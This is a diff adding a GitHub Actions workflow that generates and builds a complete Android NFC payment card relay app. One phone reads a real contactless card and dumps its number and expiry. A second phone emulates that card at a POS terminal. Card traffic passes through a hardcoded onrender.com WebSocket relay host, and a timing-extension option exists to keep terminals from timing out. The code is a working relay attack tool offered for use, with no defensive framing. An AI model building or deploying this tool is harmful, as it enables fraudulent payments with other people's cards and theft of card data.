@@ -1,0 +1,528 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - uses: android-actions/setup-android@v3
+
+      - name: Install SDK components
+        run: sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools"
+
+      - name: Generate project
+        run: |
+          mkdir -p app/src/main/java/com/example/nfcrelay
+          mkdir -p app/src/main/res/layout app/src/main/res/values app/src/main/res/xml
+
+          cat > settings.gradle <<'EOF'
+          pluginManagement {
+          repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+          repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "NfcRelay"
+          include ":app"
+          EOF
+
+          cat > build.gradle <<'EOF'
+          plugins { id 'com.android.application' version '8.5.0' apply false }
+          EOF
+
+          cat > gradle.properties <<'EOF'
+          android.useAndroidX=true
+          android.nonTransitiveRClass=true
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          EOF
+
+          cat > app/build.gradle <<'EOF'
+          plugins { id 'com.android.application' }
+
+          android {
+          namespace 'com.example.nfcrelay'
+          compileSdk 34
+
+          defaultConfig {
+          applicationId "com.example.nfcrelay"
+          minSdk 21
+          targetSdk 34
+          versionCode 1
+          versionName "1.0"
+          }
+          compileOptions {
+          sourceCompatibility JavaVersion.VERSION_1_8
+          targetCompatibility JavaVersion.VERSION_1_8
+          }
+          buildTypes {
+          release {
+          minifyEnabled false
+          signingConfig signingConfigs.debug
+          }
+          }
+          }
+
+          dependencies {
+          implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+          }
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+          <uses-permission android:name="android.permission.NFC" />
+          <uses-permission android:name="android.permission.INTERNET" />
+          <uses-feature android:name="android.hardware.nfc" android:required="true" />
+          <uses-feature android:name="android.hardware.nfc.hce" android:required="true" />
+          <application
+          android:label="NFC Card Relay"
+          android:usesCleartextTraffic="true">
+          <activity android:name=".MainActivity" android:exported="true">
+          <intent-filter>
+          <action android:name="android.intent.action.MAIN" />
+          <category android:name="android.intent.category.LAUNCHER" />
+          </intent-filter>
+          </activity>
+          <activity android:name=".ReaderActivity" android:exported="false" />
+          <service
+          android:name=".HceCardService"
+          android:exported="true"
+          android:permission="android.permission.BIND_NFC_SERVICE">
+          <intent-filter>
+          <action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE" />
+          </intent-filter>
+          <meta-data
+          android:name="android.nfc.cardemulation.host_apdu_service"
+          android:resource="@xml/apduservice" />
+          </service>
+          </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<'EOF'
+          <resources>
+          <string name="app_name">NFC Card Relay</string>
+          <string name="svc_desc">Card emulator (Phone B)</string>
+          <string name="aid_group">Payment cards</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/xml/apduservice.xml <<'EOF'
+          <host-apdu-service xmlns:android="http://schemas.android.com/apk/res/android"
+          android:description="@string/svc_desc"
+          android:requireDeviceUnlock="false">
+          <aid-group android:description="@string/aid_group" android:category="payment">
+          <aid-filter android:name="325041592E5359532E4444463031"/>
+          <aid-filter android:name="A0000000031010"/>
+          <aid-filter android:name="A0000000032010"/>
+          <aid-filter android:name="A0000000038010"/>
+          <aid-filter android:name="A0000000041010"/>
+          <aid-filter android:name="A0000000043060"/>
+          <aid-filter android:name="A0000000046000"/>
+          <aid-filter android:name="A00000002501"/>
+          <aid-filter android:name="A0000000651010"/>
+          <aid-filter android:name="A0000001523010"/>
+          <aid-filter android:name="A000000333010101"/>
+          <aid-filter android:name="A0000002771010"/>
+          </aid-group>
+          </host-apdu-service>
+          EOF
+
+          cat > app/src/main/res/layout/activity_main.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+          android:layout_width="match_parent" android:layout_height="match_parent">
+          <LinearLayout android:orientation="vertical" android:padding="20dp"
+          android:layout_width="match_parent" android:layout_height="wrap_content">
+          <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
+          android:text="Relay server" android:textStyle="bold"/>
+          <EditText android:id="@+id/server" android:layout_width="match_parent"
+          android:layout_height="wrap_content" android:inputType="textUri"/>
+          <TextView android:layout_width="match_parent" android:layout_height="wrap_content"
+          android:text="Room code - same on both phones" android:textStyle="bold"
+          android:layout_marginTop="12dp"/>
+          <EditText android:id="@+id/room" android:layout_width="match_parent"
+          android:layout_height="wrap_content" android:inputType="number"/>
+          <CheckBox android:id="@+id/wtx" android:layout_width="match_parent"
+          android:layout_height="wrap_content" android:layout_marginTop="8dp"
+          android:text="Slow-link mode (WTX) - use if POS times out"/>
+          <Button android:id="@+id/btnReader" android:layout_width="match_parent"
+          android:layout_height="60dp" android:layout_marginTop="20dp"
+          android:text="PHONE A - hold the real card"/>
+          <Button android:id="@+id/btnEmulate" android:layout_width="match_parent"
+          android:layout_height="60dp" android:layout_marginTop="12dp"
+          android:text="PHONE B - tap at the POS"/>
+          <TextView android:id="@+id/status" android:layout_width="match_parent"
+          android:layout_height="wrap_content" android:layout_marginTop="20dp"
+          android:textSize="14sp" android:text="Idle"/>
+          </LinearLayout>
+          </ScrollView>
+          EOF
+
+          cat > app/src/main/res/layout/activity_reader.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+          android:layout_width="match_parent" android:layout_height="match_parent">
+          <TextView android:id="@+id/status"
+          android:layout_width="match_parent" android:layout_height="wrap_content"
+          android:padding="16dp" android:textSize="15sp"
+          android:text="Connecting..."/>
+          </ScrollView>
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/Hex.java <<'EOF'
+          package com.example.nfcrelay;
+          public class Hex {
+          public static String encode(byte[] b) {
+          StringBuilder sb = new StringBuilder(b.length * 2);
+          for (byte x : b) sb.append(String.format("%02X", x));
+          return sb.toString();
+          }
+          public static byte[] decode(String s) {
+          s = s.replaceAll("\\s", "");
+          byte[] out = new byte[s.length() / 2];
+          for (int i = 0; i < out.length; i++)
+          out[i] = (byte) Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16);
+          return out;
+          }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/Settings.java <<'EOF'
+          package com.example.nfcrelay;
+          import android.content.Context;
+          import android.content.SharedPreferences;
+          public class Settings {
+          private static SharedPreferences sp(Context c) {
+          return c.getSharedPreferences("prefs", Context.MODE_PRIVATE);
+          }
+          public static boolean wtx(Context c) { return sp(c).getBoolean("wtx", false); }
+          public static void setWtx(Context c, boolean v) {
+          sp(c).edit().putBoolean("wtx", v).apply();
+          }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/RelayBridge.java <<'EOF'
+          package com.example.nfcrelay;
+          import okhttp3.*;
+          import java.util.concurrent.*;
+          public class RelayBridge {
+          public interface Listener {
+          void onStatus(String s);
+          void onRequest(String hexApdu);
+          }
+          private static RelayBridge instance;
+          private WebSocket ws;
+          private volatile boolean connected;
+          private Listener listener;
+          private final BlockingQueue<String> inbox = new LinkedBlockingQueue<>();
+          private final OkHttpClient client = new OkHttpClient.Builder()
+          .connectTimeout(60, TimeUnit.SECONDS)
+          .readTimeout(0, TimeUnit.SECONDS)
+          .pingInterval(20, TimeUnit.SECONDS)
+          .build();
+          public static synchronized RelayBridge get() {
+          if (instance == null) instance = new RelayBridge();
+          return instance;
+          }
+          public boolean isConnected() { return connected; }
+          public void connect(String serverUrl, String room, Listener l) {
+          disconnect();
+          this.listener = l;
+          String url = serverUrl.trim();
+          while (url.endsWith("/")) url = url.substring(0, url.length() - 1);
+          if (url.startsWith("https://")) url = "wss://" + url.substring(8);
+          else if (url.startsWith("http://")) url = "ws://" + url.substring(7);
+          else if (!url.startsWith("ws")) url = "wss://" + url;
+          String full = url + "?room=" + room;
+          status("Connecting...");
+          ws = client.newWebSocket(new Request.Builder().url(full).build(),
+          new WebSocketListener() {
+          @Override public void onOpen(WebSocket w, Response r) {
+          connected = true;
+          status("CONNECTED  -  room " + room);
+          }
+          @Override public void onMessage(WebSocket w, String text) {
+          if (text.startsWith("REQ:")) {
+          if (listener != null) listener.onRequest(text.substring(4));
+          } else if (text.startsWith("RES:")) {
+          inbox.offer(text.substring(4));
+          }
+          }
+          @Override public void onFailure(WebSocket w, Throwable t, Response r) {
+          connected = false;
+          status("Socket error: " + (t != null ? t.getMessage() : "unknown"));
+          }
+          @Override public void onClosed(WebSocket w, int code, String reason) {
+          connected = false;
+          status("Disconnected");
+          }
+          });
+          }
+          public byte[] exchange(byte[] apdu) {
+          if (ws == null || !connected) return new byte[]{0x6F, 0x00};
+          try {
+          while (inbox.poll() != null) { }
+          ws.send("REQ:" + Hex.encode(apdu));
+          String res = inbox.poll(2500, TimeUnit.MILLISECONDS);
+          if (res == null) return new byte[]{0x6F, 0x00};
+          return Hex.decode(res);
+          } catch (Exception e) {
+          return new byte[]{0x6F, 0x00};
+          }
+          }
+          public void respond(String hexResp) {
+          if (ws != null) ws.send("RES:" + hexResp);
+          }
+          public void disconnect() {
+          if (ws != null) {
+          try { ws.close(1000, "bye"); } catch (Exception ignored) {}
+          ws = null;
+          }
+          connected = false;
+          inbox.clear();
+          }
+          private void status(String s) { if (listener != null) listener.onStatus(s); }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/EmvDump.java <<'EOF'
+          package com.example.nfcrelay;
+          import android.nfc.tech.IsoDep;
+          public class EmvDump {
+          public static String dump(IsoDep card) {
+          StringBuilder sb = new StringBuilder();
+          try {
+          byte[] ppse = card.transceive(Hex.decode("00A404000E325041592E5359532E444446303100"));
+          String aid = findTag(Hex.encode(ppse), "4F");
+          if (aid == null) return "No PPSE - not a contactless payment card";
+          sb.append("AID: ").append(aid).append('\n');
+          card.transceive(Hex.decode("00A40400" + String.format("%02X", aid.length() / 2) + aid + "00"));
+          try { card.transceive(Hex.decode("80A8000002830000")); } catch (Exception ignored) {}
+          StringBuilder data = new StringBuilder();
+          for (int i = 1; i <= 6; i++) {
+          try {
+          byte[] r = card.transceive(Hex.decode(String.format("00B2%02X0C00", i)));
+          String h = Hex.encode(r);
+          if (r.length < 2 || !h.endsWith("9000")) break;
+          data.append(h, 0, h.length() - 4);
+          } catch (Exception e) { break; }
+          }
+          String all = data.toString();
+          String pan = findTag(all, "5A");
+          String exp = findTag(all, "5F24");
+          if (pan != null) sb.append("PAN: ").append(pan.replaceAll("F$", "")).append('\n');
+          if (exp != null) sb.append("Expiry YYMMDD: ").append(exp).append('\n');
+          sb.append("Read ").append(all.length() / 2).append(" bytes");
+          } catch (Exception e) {
+          return "Dump error: " + e.getMessage();
+          }
+          return sb.toString();
+          }
+          private static String findTag(String hex, String want) {
+          int i = 0;
+          while (i + 2 <= hex.length()) {
+          String t1 = hex.substring(i, i + 2);
+          int b1 = Integer.parseInt(t1, 16);
+          i += 2;
+          String tag = t1;
+          if ((b1 & 0x1F) == 0x1F) {
+          if (i + 2 > hex.length()) return null;
+          tag += hex.substring(i, i + 2);
+          i += 2;
+          }
+          if (i + 2 > hex.length()) return null;
+          int len = Integer.parseInt(hex.substring(i, i + 2), 16);
+          i += 2;
+          if (len == 0x81) {
+          if (i + 2 > hex.length()) return null;
+          len = Integer.parseInt(hex.substring(i, i + 2), 16); i += 2;
+          } else if (len == 0x82) {
+          if (i + 4 > hex.length()) return null;
+          len = Integer.parseInt(hex.substring(i, i + 4), 16); i += 4;
+          }
+          int end = i + len * 2;
+          if (end > hex.length()) return null;
+          String val = hex.substring(i, end);
+          if (tag.equalsIgnoreCase(want)) return val;
+          if ((b1 & 0x20) != 0) {
+          String r = findTag(val, want);
+          if (r != null) return r;
+          }
+          i = end;
+          }
+          return null;
+          }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/HceCardService.java <<'EOF'
+          package com.example.nfcrelay;
+          import android.nfc.cardemulation.HostApduService;
+          import android.os.Bundle;
+          public class HceCardService extends HostApduService {
+          @Override
+          public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
+          if (Settings.wtx(this)) {
+          new Thread(() -> {
+          byte[] r = RelayBridge.get().exchange(apdu);
+          try { Thread.sleep(15); } catch (InterruptedException ignored) {}
+          sendResponseApdu(r);
+          }).start();
+          return new byte[]{0x60, 0x00};
+          }
+          return RelayBridge.get().exchange(apdu);
+          }
+          @Override public void onDeactivated(int reason) { }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/ReaderActivity.java <<'EOF'
+          package com.example.nfcrelay;
+          import android.app.Activity;
+          import android.nfc.NfcAdapter;
+          import android.nfc.Tag;
+          import android.nfc.tech.IsoDep;
+          import android.os.Bundle;
+          import android.widget.TextView;
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+          public class ReaderActivity extends Activity implements NfcAdapter.ReaderCallback {
+          private NfcAdapter nfcAdapter;
+          private IsoDep isoDep;
+          private TextView status;
+          private final ExecutorService exec = Executors.newSingleThreadExecutor();
+          @Override protected void onCreate(Bundle b) {
+          super.onCreate(b);
+          setContentView(R.layout.activity_reader);
+          status = findViewById(R.id.status);
+          String server = getIntent().getStringExtra("server");
+          String room = getIntent().getStringExtra("room");
+          RelayBridge.get().connect(server, room, new RelayBridge.Listener() {
+          @Override public void onStatus(String s) { runOnUiThread(() -> status.setText(s)); }
+          @Override public void onRequest(String hexApdu) {
+          exec.execute(() -> {
+          try {
+          if (isoDep == null || !isoDep.isConnected()) {
+          RelayBridge.get().respond("6F00");
+          return;
+          }
+          byte[] resp = isoDep.transceive(Hex.decode(hexApdu));
+          RelayBridge.get().respond(Hex.encode(resp));
+          runOnUiThread(() -> status.setText("Card held - relaying.\nLast cmd: " + hexApdu));
+          } catch (Exception e) {
+          RelayBridge.get().respond("6F00");
+          }
+          });
+          }
+          });
+          nfcAdapter = NfcAdapter.getDefaultAdapter(this);
+          }
+          @Override protected void onResume() {
+          super.onResume();
+          if (nfcAdapter != null) {
+          nfcAdapter.enableReaderMode(this, this,
+          NfcAdapter.FLAG_READER_NFC_A
+          | NfcAdapter.FLAG_READER_NFC_B
+          | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,
+          null);
+          }
+          }
+          @Override protected void onPause() {
+          super.onPause();
+          if (nfcAdapter != null) nfcAdapter.disableReaderMode(this);
+          }
+          @Override public void onTagDiscovered(Tag tag) {
+          final IsoDep iso = IsoDep.get(tag);
+          if (iso == null) { runOnUiThread(() -> status.setText("Not an EMV card")); return; }
+          try {
+          iso.connect();
+          iso.setTimeout(5000);
+          isoDep = iso;
+          runOnUiThread(() -> status.setText("Card detected. Reading..."));
+          } catch (Exception e) {
+          runOnUiThread(() -> status.setText("Connect failed: " + e.getMessage()));
+          return;
+          }
+          exec.execute(() -> {
+          String info = EmvDump.dump(iso);
+          runOnUiThread(() -> status.setText(info + "\n\nHold card still. Ready for POS."));
+          });
+          }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/nfcrelay/MainActivity.java <<'EOF'
+          package com.example.nfcrelay;
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.widget.*;
+          public class MainActivity extends Activity {
+          @Override protected void onCreate(Bundle b) {
+          super.onCreate(b);
+          setContentView(R.layout.activity_main);
+          EditText server = findViewById(R.id.server);
+          EditText room = findViewById(R.id.room);
+          TextView status = findViewById(R.id.status);
+          CheckBox wtx = findViewById(R.id.wtx);
+          server.setText("wss://relay-server-nx9z.onrender.com");
+          room.setText("4821");
+          wtx.setChecked(Settings.wtx(this));
+          wtx.setOnCheckedChangeListener((v, on) -> Settings.setWtx(this, on));
+          findViewById(R.id.btnReader).setOnClickListener(v -> {
+          Intent i = new Intent(this, ReaderActivity.class);
+          i.putExtra("server", server.getText().toString());
+          i.putExtra("room", room.getText().toString());
+          startActivity(i);
+          });
+          findViewById(R.id.btnEmulate).setOnClickListener(v -> {
+          RelayBridge.get().connect(server.getText().toString(),
+          room.getText().toString(),
+          new RelayBridge.Listener() {
+          @Override public void onStatus(String s) {
+          runOnUiThread(() -> status.setText(s));
+          }
+          @Override public void onRequest(String hexApdu) { }
+          });
+          status.setText("Connecting...");
+          });
+          }
+          }
+          EOF
+
+          echo "PROJECT GENERATED"
+          ls -R app
+
+      - uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.9'
+
+      - name: Build APK
+        run: gradle assembleDebug --no-daemon
+
+      - name: Collect APK
+        run: |
+          cp app/build/outputs/apk/debug/app-debug.apk NfcRelay.apk
+          ls -lh NfcRelay.apk
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: NfcRelay-apk
+          path: NfcRelay.apk
+          retention-days: 30
